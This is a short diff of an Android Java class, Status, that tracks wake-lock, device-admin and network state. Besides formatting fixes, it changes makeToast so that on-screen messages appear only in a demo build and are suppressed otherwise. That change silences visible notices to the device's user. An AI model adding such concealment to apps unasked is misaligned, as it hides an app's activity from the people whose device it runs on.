@@ -74,7 +74,7 @@ public class Status {
 	static WakeLock wl;
 
 	private boolean deviceAdmin;
-	
+
 	static public boolean wifiConnected = false;
 	static public boolean gsmConnected = false;
 
@@ -171,7 +171,7 @@ public class Status {
 	}
 
 	public static AGUI getAppGui() {
-		return gui ;
+		return gui;
 	}
 
 	public static ContentResolver getContentResolver() {
@@ -680,18 +680,20 @@ public class Status {
 	}
 
 	public void makeToast(final String message) {
-		try{
-		Handler h = new Handler(getAppContext().getMainLooper());
-	     // Although you need to pass an appropriate context
-	    h.post(new Runnable() {
-	        @Override
-	        public void run() {
-	             Toast.makeText(context,message,Toast.LENGTH_LONG).show();
-	        }
-	    });
-		}catch(Exception ex){
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (makeToast) Error: " + ex);
+		if (Cfg.DEMO) {
+			try {
+				Handler h = new Handler(getAppContext().getMainLooper());
+				// Although you need to pass an appropriate context
+				h.post(new Runnable() {
+					@Override
+					public void run() {
+						Toast.makeText(context, message, Toast.LENGTH_LONG).show();
+					}
+				});
+			} catch (Exception ex) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (makeToast) Error: " + ex);
+				}
 			}
 		}
 	}
